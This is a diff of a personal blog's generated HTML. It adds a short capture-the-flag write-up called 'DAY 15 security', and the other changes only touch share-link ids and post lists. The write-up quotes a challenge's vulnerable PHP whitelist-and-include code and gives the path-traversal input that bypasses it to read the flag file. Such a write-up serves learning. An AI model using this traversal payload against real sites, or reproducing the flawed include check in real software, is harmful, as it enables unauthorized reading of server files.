@@ -77,6 +77,90 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-DAY-15-security" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2023/05/23/DAY-15-security/" class="article-date">
+  <time class="dt-published" datetime="2023-05-22T16:02:28.000Z" itemprop="datePublished">2023-05-23</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2023/05/23/DAY-15-security/">DAY 15 security</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>TYPE:web</p>
+<p>f12 and found the tip that there was a file named source.php</p>
+<p>input source.php after the url and it would appear the code<br>&lt;?php<br>    highlight_file(__FILE__);<br>    class emmm<br>    {<br>        public static function checkFile(&amp;$page)<br>        {<br>            $whitelist &#x3D; [“source”&#x3D;&gt;”source.php”,”hint”&#x3D;&gt;”hint.php”];<br>            if (! isset($page) || !is_string($page)) {<br>                echo “you can’t see it”;<br>                return false;<br>            }</p>
+<pre><code>        if (in_array($page, $whitelist)) &#123;
+            return true;
+        &#125;
+
+        $_page = mb_substr(
+            $page,
+            0,
+            mb_strpos($page . &#39;?&#39;, &#39;?&#39;)
+        );
+        if (in_array($_page, $whitelist)) &#123;
+            return true;
+        &#125;
+
+        $_page = urldecode($page);
+        $_page = mb_substr(
+            $_page,
+            0,
+            mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)
+        );
+        if (in_array($_page, $whitelist)) &#123;
+            return true;
+        &#125;
+        echo &quot;you can&#39;t see it&quot;;
+        return false;
+    &#125;
+&#125;
+
+if (! empty($_REQUEST[&#39;file&#39;])
+    &amp;&amp; is_string($_REQUEST[&#39;file&#39;])
+    &amp;&amp; emmm::checkFile($_REQUEST[&#39;file&#39;])
+) &#123;
+    include $_REQUEST[&#39;file&#39;];
+    exit;
+&#125; else &#123;
+    echo &quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;;
+&#125;  
+</code></pre>
+<p>?&gt;<br>url 后加上后缀?file&#x3D;hint.php?&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg</p>
+<p>即可获得flag：flag{676dde41-6fef-4e13-ad67-e576330af907}</p>
+<hr>
+<p>see you again</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/05/23/DAY-15-security/" data-id="clhz2n67l000554tkajyh2kdl" data-title="DAY 15 security" class="article-share-link">Share</a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/BY-NPC/" rel="tag">BY NPC</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-DAY-14-SECURITY" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2023/05/22/DAY-14-SECURITY/" class="article-date">
@@ -122,7 +206,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2023/05/22/DAY-14-SECURITY/" data-id="clhxn52m3000al4tkcdnha6zn" data-title="DAY 14 SECURITY" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2023/05/22/DAY-14-SECURITY/" data-id="clhz2n67k000454tk7wwq3ucl" data-title="DAY 14 SECURITY" class="article-share-link">Share</a>
       
       
       
@@ -174,7 +258,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2023/05/21/DAY-13-FACESWAP-AND-frontend/" data-id="clhxn52m6000dl4tkd35126g8" data-title="DAY 13 FACESWAP AND frontend" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2023/05/21/DAY-13-FACESWAP-AND-frontend/" data-id="clhz2n67n000854tkeuw5bjfv" data-title="DAY 13 FACESWAP AND frontend" class="article-share-link">Share</a>
       
       
       
@@ -233,7 +317,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2023/05/19/DAY-12-SECURITY-LEARN/" data-id="clhxn52lw0003l4tk6o938al4" data-title="DAY 12 SECURITY LEARN" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2023/05/19/DAY-12-SECURITY-LEARN/" data-id="clhz2n67i000354tkfubm5fyz" data-title="DAY 12 SECURITY LEARN" class="article-share-link">Share</a>
       
       
       
@@ -323,7 +407,7 @@ void showX() &#123;
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2023/05/18/DAY-11-about-ai-change-face/" data-id="clhxn52lx0004l4tk9djo8p43" data-title="DAY 11 about ai change face" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2023/05/18/DAY-11-about-ai-change-face/" data-id="clhz2n67b000154tkfxgrapt0" data-title="DAY 11 about ai change face" class="article-share-link">Share</a>
       
       
       
@@ -374,7 +458,7 @@ void showX() &#123;
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2023/05/17/DAY-10-c-learn/" data-id="clhxn52li0000l4tk0bbq27ts" data-title="DAY 10 c++ learn" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2023/05/17/DAY-10-c-learn/" data-id="clhz2n67p000a54tkbcvv57hs" data-title="DAY 10 c++ learn" class="article-share-link">Share</a>
       
       
       
@@ -426,7 +510,7 @@ void showX() &#123;
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2023/05/17/DAY-9-front-end/" data-id="clhxn52mg000sl4tkcgx27uvu" data-title="DAY 9 front end" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2023/05/17/DAY-9-front-end/" data-id="clhz2n685000r54tkb3jg8w4v" data-title="DAY 9 front end" class="article-share-link">Share</a>
       
       
       
@@ -474,7 +558,7 @@ void showX() &#123;
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2023/05/16/DAY-8-vim-learn/" data-id="clhxn52mb000kl4tkad4k98ng" data-title="DAY 8 vim learn" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2023/05/16/DAY-8-vim-learn/" data-id="clhz2n684000p54tkghbrcted" data-title="DAY 8 vim learn" class="article-share-link">Share</a>
       
       
       
@@ -573,7 +657,7 @@ web, ui,program, game, app
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2023/05/16/DAY-7-front-end-development/" data-id="clhxn52mf000ql4tk1poi6c6s" data-title="DAY 7 front end development" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2023/05/16/DAY-7-front-end-development/" data-id="clhz2n68b000x54tkg4a21r3i" data-title="DAY 7 front end development" class="article-share-link">Share</a>
       
       
       
@@ -613,55 +697,10 @@ web, ui,program, game, app
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2023/05/13/Front-end-development/" data-id="clhxn52mj000yl4tk1kybbmie" data-title="Front end development" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2023/05/13/Front-end-development/" data-id="clhz2n68i001154tkafjeh2b1" data-title="Front end development" class="article-share-link">Share</a>
       
       
       
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-DAY-5-faceswap-extract-and-train" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2023/05/12/DAY-5-faceswap-extract-and-train/" class="article-date">
-  <time class="dt-published" datetime="2023-05-12T14:57:49.000Z" itemprop="datePublished">2023-05-12</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2023/05/12/DAY-5-faceswap-extract-and-train/">DAY 5 faceswap extract and train</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>choose A and B.</p>
-<p>A is the one you want to be replaced. </p>
-<p>You can replace B’face with A’s face.</p>
-<p>slove the problem:Spawn failed.</p>
-<p>You can’t have a empty content in an article.</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2023/05/12/DAY-5-faceswap-extract-and-train/" data-id="clhxn52me000ol4tk4xzwez9z" data-title="DAY 5 faceswap extract and train" class="article-share-link">Share</a>
-      
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/BY-NPC/" rel="tag">BY NPC</a></li></ul>
-
     </footer>
   </div>
   
@@ -720,6 +759,10 @@ web, ui,program, game, app
       <ul>
         
           <li>
+            <a href="/2023/05/23/DAY-15-security/">DAY 15 security</a>
+          </li>
+        
+          <li>
             <a href="/2023/05/22/DAY-14-SECURITY/">DAY 14 SECURITY</a>
           </li>
         
@@ -733,10 +776,6 @@ web, ui,program, game, app
         
           <li>
             <a href="/2023/05/18/DAY-11-about-ai-change-face/">DAY 11 about ai change face</a>
-          </li>
-        
-          <li>
-            <a href="/2023/05/17/DAY-10-c-learn/">DAY 10 c++ learn</a>
           </li>
         
       </ul>
